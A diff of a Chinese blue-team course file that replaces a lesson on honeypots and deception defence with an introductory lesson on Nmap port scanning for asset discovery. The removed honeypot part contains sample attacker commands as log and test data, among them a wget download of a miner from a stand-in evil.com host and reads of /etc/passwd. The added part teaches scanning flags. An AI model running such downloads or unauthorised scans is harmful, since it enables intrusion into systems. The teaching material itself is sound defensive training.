@@ -1,396 +1,254 @@
-# Day 12：欺骗防御与蜜罐技术
-## 在家里放一些假珠宝，让小偷白忙活
+---
+day: 12
+title: 蓝队常用扫描工具Nmap
+phase: 第一阶段
+difficulty: ⭐⭐ 基础
+---
+
+# Day 12：蓝队常用扫描工具——Nmap
+
+> **阶段**：第一阶段 · 蓝队极速上岗 | **难度**：⭐⭐ 基础 | **课时**：2-3小时
 
 ---
 
-> 🎯 **今日目标**  
-> 理解蜜罐部署策略 · 掌握蜜罐溯源技术 · 学习欺骗防御架构
+## 📋 今日学习目标
+
+1. 理解端口扫描的原理（用敲门比喻）
+2. 掌握Nmap的安装和基本使用方法
+3. 熟练使用3种以上Nmap扫描参数
+4. 能够解读Nmap的扫描结果
+5. 理解蓝队使用Nmap的场景（资产发现/安全巡检）
 
 ---
 
-## 📖 一、蜜罐是什么？——给小偷准备的"假金库"
+## 📖 核心知识讲解
 
-想象你在森林里有一间木屋，经常有小偷光顾。你很聪明，在屋子外面放了一个**假的宝箱**：
+### 一、蓝队为什么要学Nmap？
+
+很多人以为Nmap是"黑客工具"，其实它在蓝队手中同样是利器：
+
+| 蓝队场景 | 用Nmap做什么 |
+|:---|:---|
+| **资产发现** | 扫描公司网段，发现所有在线设备（防止被遗忘的"幽灵资产"） |
+| **端口检查** | 检查服务器开放的端口是否符合基线要求 |
+| **漏洞排查** | 发现不该开放的服务（如Telnet、默认Redis） |
+| **入侵验证** | 收到告警后扫描可疑IP，验证目标是否真的开放了被攻击的服务 |
+| **安全巡检** | 定期扫描，和上次的结果对比，发现新开放的可疑端口 |
+
+### 二、端口扫描是什么？（用敲门来理解）
+
+想象一栋大楼里有65535个房间（端口号），你想知道哪些房间有人：
+
+| 扫描方式 | 敲门比喻 | 优缺点 |
+|:---|:---|:---|
+| **SYN扫描(-sS)** | 敲门听到回音就离开（不推门进去） | 速度快，不容易被记录 |
+| **TCP全连接扫描(-sT)** | 敲门→门开→说"不好意思走错了" | 最准确，但会被完整记录 |
+| **UDP扫描(-sU)** | 扔个纸团进去看有没有人回 | 速度慢，但能发现UDP服务 |
+| **Ping扫描(-sn)** | 只确认这栋楼存不存在 | 最快，只发现存活主机 |
+
+### 三、Nmap基本使用
+
+#### 安装
+```bash
+# Kali Linux自带，无需安装
+# Ubuntu/Debian:
+sudo apt install nmap
+
+# Windows:
+# 下载地址：https://nmap.org/download.html
+```
+
+#### 最基础的用法
+```bash
+nmap 目标IP或域名
+
+# 示例：扫描baidu.com
+nmap baidu.com
+```
+
+#### 常用参数速查表
+
+| 参数 | 全称 | 作用 | 什么时候用 |
+|:---|:---|:---|:---|
+| `-sS` | SYN Stealth Scan | SYN半开放扫描（最常用） | 默认扫描方式 |
+| `-sT` | TCP Connect Scan | TCP全连接扫描 | 没root权限时用 |
+| `-sU` | UDP Scan | UDP端口扫描 | 排查DNS/DHCP/SNMP |
+| `-sV` | Version Detection | 检测服务版本 | 想知道具体软件和版本 |
+| `-O` | OS Detection | 操作系统识别 | 判断目标是什么系统 |
+| `-p` | Port | 指定端口 | 只扫特定端口 |
+| `-p-` | All Ports | 扫全部65535个端口 | 全面排查时用（很慢！） |
+| `-F` | Fast | 快速扫描（只扫100个常用端口） | 快速巡检 |
+| `-A` | Aggressive | 激进扫描（包含版本+OS+脚本） | 全面信息收集 |
+| `-Pn` | No Ping | 跳过ping直接扫描 | 目标禁用ping时用 |
+| `-T0~T5` | Timing | 扫描速度(0最慢5最快) | T4为默认，T5可能丢包 |
+| `-oN` | Output Normal | 保存结果为文本 | 输出报告 |
+| `-oX` | Output XML | 保存结果为XML | 导入其他工具 |
+
+### 四、实战扫描示例
+
+#### 示例1：快速查看目标开放了哪些端口
+```bash
+nmap -F 192.168.1.1
+
+# 输出示例：
+# PORT     STATE    SERVICE
+# 22/tcp   open     ssh
+# 80/tcp   open     http
+# 443/tcp  open     https
+# 3306/tcp open     mysql
+# 8080/tcp open     http-proxy
+```
+
+**蓝队解读：** 这台服务器开了SSH、Web(80/443)、MySQL、还有一个8080上跑着Web服务。如果这是一台只应该跑Web的服务器，那3306（MySQL对外暴露）就是风险点。
+
+#### 示例2：检测服务版本
+```bash
+nmap -sV -p 22,80,443 192.168.1.1
+
+# 输出示例：
+# PORT     STATE  SERVICE    VERSION
+# 22/tcp   open   ssh        OpenSSH 6.6.1p1 (protocol 2.0)
+# 80/tcp   open   http       Apache httpd 2.2.15
+# 443/tcp  open   ssl/http   Apache httpd 2.2.15
+```
+
+**蓝队解读：** OpenSSH 6.6.1是2014年的老版本，Apache 2.2.15更老（2010年）。这些版本可能有严重漏洞，需要升级或加固。
+
+#### 示例3：扫描整个网段的存活主机
+```bash
+nmap -sn 192.168.1.0/24
+
+# 输出示例：
+# Host 192.168.1.1 is up.      # 网关
+# Host 192.168.1.100 is up.    # 员工电脑
+# Host 192.168.1.200 is up.    # 未知设备！
+```
+
+**蓝队解读：** 发现了一台不该存在的设备（192.168.1.200），可能是有人私自接入的设备，也可能是攻击者的跳板机。
+
+#### 示例4：组合参数，一次全面扫描
+```bash
+# 对单个主机进行全面扫描
+nmap -sS -sV -O -p- -T4 192.168.1.1
+
+# 参数解释：
+# -sS: SYN扫描
+# -sV: 检测服务版本
+# -O:  识别操作系统
+# -p-: 扫全部端口
+# -T4: 速度第4档（较快）
+```
+
+### 五、Nmap扫描结果的蓝队解读指南
+
+扫描完后，你需要逐条判断：
 
 ```
-📦 假宝箱里：
-  - 假珠宝（不值钱的玻璃珠）
-  - 一个隐藏摄像头 📷
-  - 一个GPS追踪器 📍
-  - 一个报警器 🚨
-
-结果：
-  小偷打开宝箱 → 触发警报 → 被摄像头拍下 → GPS追踪去向
+PORT     STATE    SERVICE       VERSION               危险评估
+22/tcp   open     ssh           OpenSSH 8.0             🟢 正常
+80/tcp   open     http          nginx 1.18.0            🟢 正常
+443/tcp  open     ssl/http      nginx 1.18.0            🟢 正常
+23/tcp   open     telnet        Linux telnetd           🔴 高危！明文协议
+6379/tcp open     redis         Redis 5.0.0             🔴 高危！默认无密码
+445/tcp  open     netbios-ssn   Samba smbd              🟡 中危
+3306/tcp filtered mysql                                  🟢 关了，安全
 ```
 
-**这就是蜜罐（Honeypot）！** 在网络世界里，蜜罐就是一个故意放出来的"诱饵服务器"，看起来很脆弱、很有价值，但其实：
+**判断标准：**
+- 🔴 `telnet(23)`、`ftp明文(21)`、无密码`redis(6379)`、无密码`mongodb(27017)` → 立即处理
+- 🟡 `SMB(445)`、`RDP(3389)`、`MySQL外网(3306)` → 需要评估是否需要对外开放
+- 🟢 Web服务(80/443)、SSH(22) → 正常，但要确保最新版本
 
-- ✅ 上面没有真实数据
-- ✅ 访问者的一举一动都被记录
-- ✅ 任何访问都高度可疑（因为正常人不该碰它）
+### 六、蓝队的Nmap使用准则
+
+> ⚠️ **重要**：作为蓝队，扫描前请确认：
+> 1. 只扫描自己负责的资产或获得授权的系统
+> 2. 不经授权扫描他人系统可能违法！
+> 3. 在生产环境中注意扫描速度，-T5可能影响业务
 
 ---
 
-## 📖 二、蜜罐的三大无敌优势
+## 🔧 实操任务
 
-### 🎯 优势1：告警质量极高
+### 任务1：扫描你的本地虚拟机（20分钟）
 
-```
-传统IDS：       一天1万条告警 → 9900条是误报
-蜜罐：          一天3条告警 → 3条都是真实攻击
+```bash
+# 1. 找出虚拟机的IP
+ip addr show
+# 或
+ifconfig
 
-为什么？因为蜜罐上没有任何正常业务，
-访问它的只可能是：黑客、扫描器、或者走错路的管理员
-→ 管理员走错路的概率极低
-→ 所以蜜罐的告警几乎100%是真实攻击！
-```
+# 2. 扫描本机
+nmap 127.0.0.1
 
-### 🎯 优势2：捕获完整的攻击行为
+# 3. 快速扫描（只看100个常用端口）
+nmap -F 127.0.0.1
 
-```
-高交互蜜罐（真实操作系统）能记录：
-  ✅ 攻击者输入了什么命令
-  ✅ 攻击者下载了什么工具
-  ✅ 攻击者修改了什么文件
-  ✅ 攻击者的IP和时区
-  ✅ 攻击者的键盘输入习惯
+# 4. 检测服务版本
+nmap -sV 127.0.0.1
 
-→ 这些信息对溯源来说是无价之宝！
+# 5. 如果有条件的话：
+# 在电脑上安装Nmap的Windows版，扫描Kali虚拟机
 ```
 
-### 🎯 优势3：给蓝队争取时间
+### 任务2：扫描对比练习（15分钟）
 
-```
-攻击者在蜜罐里"忙活"了2小时
-  → 以为自己攻破了一台重要服务器
-  → 实际上是在假服务器上白费功夫
-  → 蓝队利用这2小时加固了真实的服务器
-```
+```bash
+# 扫baidu.com（互联网大站）
+nmap -F baidu.com
 
----
-
-## 📖 三、蜜罐的类型
-
-| 类型 | 复杂度 | 交互深度 | 例子 | 像什么？ |
-|------|--------|----------|------|----------|
-| **低交互蜜罐** | ⭐ | 只模拟端口/服务 banner | Honeyd | 纸板假人保安 |
-| **中交互蜜罐** | ⭐⭐⭐ | 模拟服务的简单交互 | Cowrie(SSH), Dionaea(恶意软件) | 充气假人保安 |
-| **高交互蜜罐** | ⭐⭐⭐⭐⭐ | 真实操作系统和服务 | 真实的Windows/Linux | 真人便衣保安 |
-
-### 🐄 Cowrie——最流行的SSH/Telnet蜜罐
-
-```
-部署Cowrie后，攻击者尝试SSH登录你的蜜罐：
-  
-攻击者 → ssh root@蜜罐IP
-蜜罐(假) → 欢迎登录！（密码随便输都会"接受"）
-攻击者 → uname -a、cat /etc/passwd、wget 恶意软件...
-蜜罐 → 全部记录！
-
-Cowrie还能：
-  ✅ 记录攻击者下载的所有文件
-  ✅ 回放攻击者的操作（像放电影一样）
-  ✅ 用JSON格式输出便于导入SIEM
+# 观察：
+# - 开放了什么端口？
+# - 和你的虚拟机有什么不同？
+# - 为什么有些端口显示filtered？
 ```
 
-### 🪤 Dionaea——恶意软件捕获蜜罐
+### 任务3：解读扫描结果（15分钟）
 
-```
-Dionaea模拟各种有漏洞的服务：
-  - SMB（Windows文件共享）
-  - FTP、HTTP、MySQL、SIP...
+根据你的扫描结果，回答：
+1. 你的系统开放了哪些端口？
+2. 每个端口对应什么服务？
+3. 有没有你不认识的服务？
+4. 哪个端口你觉得可能存在安全风险？为什么？
 
-攻击者扫描到你 → 发现"漏洞" → 上传恶意软件
-  → Dionaea接受恶意软件 → 保存样本 → 发送到分析平台
+### 任务4：保存扫描报告（10分钟）
 
-整个过程中，攻击者不知道自己在上传给一个"假的"服务器！
-```
+```bash
+# 保存扫描结果为文件
+nmap -sV -oN scan_report.txt 127.0.0.1
 
----
-
-## 📖 四、蜜罐放哪里？——护网部署策略
-
-### 🗺️ 部署蓝图
-
-```
-                ┌─────────────┐
-  互联网 ────── │  防火墙/WAF  │ ───── DMZ ───── 蜜罐①
-                └──────┬──────┘          (Web蜜罐)
-                       │
-              ┌────────┴────────┐
-              │   核心交换机     │
-              └────────┬────────┘
-         ┌─────────────┼─────────────┐
-    生产服务器区    数据库区    蜜罐②(内网)
-                              SRV-ADMIN-01 ← 名字像域控
-                              SRV-FINANCE-01 ← 名字像财务系统
-```
-
-### 📍 三个最佳位置
-
-```
-① 外网DMZ蜜罐：
-   目的：收集互联网攻击情报
-   放什么：Web蜜罐、SSH蜜罐
-   
-② 内网核心区蜜罐：
-   目的：检测已突破边界的攻击者
-   放什么：假域控、假财务系统、假数据库
-   名字要像真的一样：SRV-AD-01, FINANCE-DB, HR-PORTAL
-
-③ 工控区蜜罐（如果有）：
-   目的：保护工控系统
-   放什么：Conpot工控蜜罐
-```
-
-### 🎭 蜜罐起名艺术
-
-```
-❌ 差的名字：
-  honeypot-01、deception-server → 一看就假
-
-✅ 好的名字：
-  SRV-EXCHANGE-01、PAYMENT-GW、CORP-FILE-01
-  → 和真实服务器命名风格一致，以假乱真
-```
-
----
-
-## 📖 五、护网中的蜜罐实战
-
-### 🎯 场景1：SSH蜜罐捕获暴力破解
-
-```
-Day1 凌晨 02:15
-  Cowrie蜜罐告警：IP 45.33.32.156 正在暴力破解SSH
-  
-  Cowrie记录：
-  - 尝试用户：root, admin, test, oracle
-  - 尝试密码：admin123, password, root123...
-  - 最终"成功"登录（蜜罐让它"成功"的）
-  - 登录后执行：uname -a, wget http://evil.com/miner.tar.gz
-  
-→ 蓝队行动：
-  1. 立即封禁 45.33.32.156
-  2. 分析 miner.tar.gz → 发现是挖矿木马
-  3. 将IP+样本IOC共享给兄弟单位
-  4. 确认蜜罐日志完整性
-```
-
-### 🎯 场景2：假数据库诱捕数据窃取
-
-```
-Day5 14:30
-  假MySQL蜜罐告警：来自内网IP 10.0.0.99 的异常查询
-  
-  日志显示：
-  SELECT * FROM users;
-  SELECT * FROM credit_cards;
-  SELECT * FROM salaries;
-  
-→ 发现：
-  - 10.0.0.99 是昨天被钓鱼成功的HR电脑
-  - 攻击者已在内网横向移动
-  - 正在寻找敏感数据
-  
-→ 蓝队行动：
-  立即隔离10.0.0.99 → 启动PDCERF应急响应
-  蜜罐成功预警了内网入侵！
-```
-
----
-
-## 📖 六、T-Pot——白菜价的蜜罐全家桶
-
-T-Pot是德国电信开源的多蜜罐集成平台，一个Docker命令部署16种蜜罐：
-
-```
-T-Pot包含的蜜罐：
-  🐄 Cowrie        — SSH/Telnet蜜罐
-  🪤 Dionaea       — 恶意软件捕获
-  🏭 Conpot        — 工控蜜罐
-  🕸️ Elasticpot    — Elasticsearch蜜罐
-  📧 Mailoney      — 邮件蜜罐
-  🌐 Honeytrap     — 智能响应蜜罐
-  🐙 Glutton       — 万能蜜罐（什么协议都回应）
-  ...还有9种！
-
-部署命令（简单到令人发指）：
-  git clone https://github.com/telekom-security/tpotce
-  cd tpotce && sudo ./install.sh --type=user
-```
-
----
-
-## 💻 七、动手试试：蜜罐告警分析器
-
-```python
-# 蜜罐告警自动分析系统
-from collections import defaultdict
-
-class HoneypotAnalyzer:
-    def __init__(self):
-        self.events = []
-    
-    def add_event(self, ip, service, action, payload=''):
-        """记录蜜罐捕获的事件"""
-        self.events.append({
-            'ip': ip,
-            'service': service,
-            'action': action,
-            'payload': payload
-        })
-    
-    def analyze(self):
-        """分析攻击者行为"""
-        # 按IP聚合攻击活动
-        ip_activities = defaultdict(list)
-        for event in self.events:
-            ip_activities[event['ip']].append(event)
-        
-        print('=== 🍯 蜜罐告警分析报告 ===\n')
-        
-        for ip, activities in ip_activities.items():
-            num_activities = len(activities)
-            services_used = set(a['service'] for a in activities)
-            has_malware = any('wget' in a.get('payload', '') or 
-                            'curl' in a.get('payload', '') 
-                            for a in activities)
-            
-            # 攻击者活跃度评估
-            if num_activities >= 5 and has_malware:
-                level = '🔴 高活跃攻击者 (尝试下载恶意软件!)'
-            elif num_activities >= 3:
-                level = '🟠 活跃攻击者'
-            else:
-                level = '🟡 低活跃探测'
-            
-            print(f'[攻击者] {ip}  →  {level}')
-            print(f'  使用服务: {", ".join(services_used)}')
-            print(f'  活动次数: {num_activities}')
-            
-            # 展示具体行为
-            for act in activities:
-                icon = {'ssh': '🔑', 'mysql': '🗄️', 'rdp': '🖥️',
-                        'http': '🌐', 'ftp': '📁'}.get(act['service'], '🔧')
-                print(f'  {icon} [{act["service"]}] {act["action"]}')
-                if act['payload']:
-                    print(f'     Payload: {act["payload"][:80]}...' 
-                          if len(act['payload']) > 80 
-                          else f'     Payload: {act["payload"]}')
-            print()
-
-# === 模拟蜜罐一天的数据 ===
-analyzer = HoneypotAnalyzer()
-
-# 攻击者A：暴力破解+尝试下载挖矿程序
-analyzer.add_event('45.33.32.156', 'ssh', '登录尝试', 'root/admin123')
-analyzer.add_event('45.33.32.156', 'ssh', '执行命令', 'wget http://evil.com/miner.tar.gz')
-analyzer.add_event('45.33.32.156', 'ssh', '执行命令', 'tar -xzf miner.tar.gz')
-analyzer.add_event('45.33.32.156', 'ssh', '执行命令', './miner --pool pool.evil.com')
-analyzer.add_event('45.33.32.156', 'mysql', '数据查询', 'SELECT * FROM users')
-
-# 攻击者B：简单的端口扫描探测
-analyzer.add_event('103.224.182.250', 'http', '扫描探测', 'GET /wp-admin')
-analyzer.add_event('103.224.182.250', 'http', '扫描探测', 'GET /admin')
-
-analyzer.analyze()
+# 查看保存的报告
+cat scan_report.txt
 ```
 
 ---
 
-## 🧪 八、今日实验：部署蜜罐全家桶
+## ✅ 验收标准
 
-### 实验目标
-在内网部署Cowrie SSH蜜罐和Dionaea恶意软件蜜罐
-
-### 实验步骤
-
-```
-1️⃣ 部署Cowrie SSH蜜罐
-   docker pull cowrie/cowrie
-   docker run -d -p 2222:2222 cowrie/cowrie
-
-2️⃣ 配置Cowrie
-   - 设置虚假的文件系统（让它看起来像真实服务器）
-   - 配置告警通知（告警发到SIEM/邮件）
-   - 设置"假"的有价值文件
-
-3️⃣ 模拟攻击者访问蜜罐
-   ssh root@localhost -p 2222
-   密码：随便输 → 蜜罐会"接受"！
-   然后试试：ls, cat /etc/passwd, wget ...
-
-4️⃣ 查看Cowrie日志
-   cat cowrie/log/cowrie.json
-   → 看到你刚才的操作全被记录了！
-
-5️⃣ 部署Dionaea捕获恶意软件样本
-   docker run -d --name dionaea -p 21:21 -p 445:445 dinotools/dionaea
-```
+- [ ] 能独立安装并使用Nmap
+- [ ] 能说出SYN扫描(-sS)和TCP全连接扫描(-sT)的区别
+- [ ] 能使用3种以上扫描参数（-F/-sV/-p/-O）
+- [ ] 能从扫描结果中识别出不安全的服务（Telnet、无密码Redis等）
+- [ ] 能导出并阅读Nmap扫描报告
+- [ ] 理解Nmap在蓝队工作中的应用场景
 
 ---
 
-## 📝 九、今日测验
+## 📝 今日小结
 
-**Q1：蜜罐告警相比传统IDS最大的优势是什么？**
-- A. 告警数量多
-- B. 误报率极低，几乎每条都是真实攻击  ✅
-- C. 部署更简单
-- D. 免费
+Nmap是蓝队进行资产发现和端口检查的"眼睛"。今天你学会了如何用Nmap扫描一台服务器，了解它开放了哪些端口、运行了什么服务。这些信息在安全巡检查中非常重要——每次扫描都可能发现被遗忘的"后门端口"。
 
-> 蜜罐没有正常业务流量，任何访问都高度可疑。IDS一天可能产生大量误报。
-
-**Q2：Cowrie是什么类型的蜜罐？**
-- A. Web蜜罐
-- B. SSH/Telnet蜜罐  ✅
-- C. 数据库蜜罐
-- D. 工控蜜罐
-
-> Cowrie模拟SSH/Telnet服务，记录攻击者的登录尝试和命令执行。
-
-**Q3：高交互蜜罐最大的优点是什么？**
-- A. 部署简单
-- B. 能捕获完整的攻击行为和恶意样本  ✅
-- C. 成本低
-- D. 风险小
-
-> 高交互蜜罐运行真实系统，攻击者交互越深入，捕获的信息越有价值。
-
-**Q4：T-Pot是什么？**
-- A. 单一蜜罐
-- B. 包含16+种蜜罐的集成平台  ✅
-- C. IDS设备
-- D. 防火墙
-
-> T-Pot是蜜罐全家桶，一个命令部署Cowrie/Dionaea/Conpot/Elasticpot等16种蜜罐。
-
-**Q5：护网中蜜罐应该部署在哪里？**
-- A. 只放外网
-- B. 内网核心区域（模拟关键资产）  ✅
-- C. 只放DMZ
-- D. 随便放
-
-> 蜜罐的重点是检测已突破边界的攻击者，所以在内网核心区域模拟域控、财务系统等关键资产效果最好。
+**记住今天的核心**：
+- `nmap -F 目标` = 快速扫描100个常用端口
+- `nmap -sV 目标` = 看服务是哪个版本
+- `nmap -sn 网段` = 发现网段内有哪些设备活着
+- `telnet(23)`、无密码`redis(6379)` = 高危，立即处理
+- 扫描要授权，不能乱扫！
 
 ---
 
-## 📚 十、课后资源
+## 📚 延伸阅读（可选）
 
-| 资源 | 链接 | 说明 |
-|------|------|------|
-| T-Pot蜜罐平台 | github.com/telekom-security/tpotce | 蜜罐全家桶 |
-| Cowrie文档 | github.com/cowrie/cowrie | SSH蜜罐 |
-| 欺骗防御白皮书 | 各大安全厂商官网 | 深入了解Deception |
-
----
-
-## 🧠 十一、专家锦囊
-
-> **赵安全说：** 护网中部署蜜罐效果显著：①蜜罐告警几乎不需要研判（肯定有问题）②能收集攻击者的工具和样本 ③能拖延攻击者时间 ④能给溯源提供重要线索。建议每个护网单位至少部署5-10个内网蜜罐。
-
-> **钱运维说：** 蜜罐部署不要"见光死"。要点：①蜜罐名字要像真实资产（SRV-FINANCE-DB）②蜜罐不要过于"完美"（适当留些"漏洞"诱惑攻击者）③蜜罐之间用蜜网串联 ④定期更换蜜罐特征 ⑤和真实业务严格隔离防止被跳板利用。
-
----
-
-📅 **Day 12 完成！** 今天你学会了用蜜罐"请君入瓮"——让攻击者在假目标上白费功夫，同时被全程录像！
+- Nmap官方文档：[nmap.org/book/man.html](https://nmap.org/book/man.html)
+- 了解Nmap脚本引擎（NSE）：`nmap --script-help=vuln` 可以查看漏洞扫描脚本
+- 了解其他扫描工具：Masscan（超快速端口扫描）、Rustscan（更快更现代）
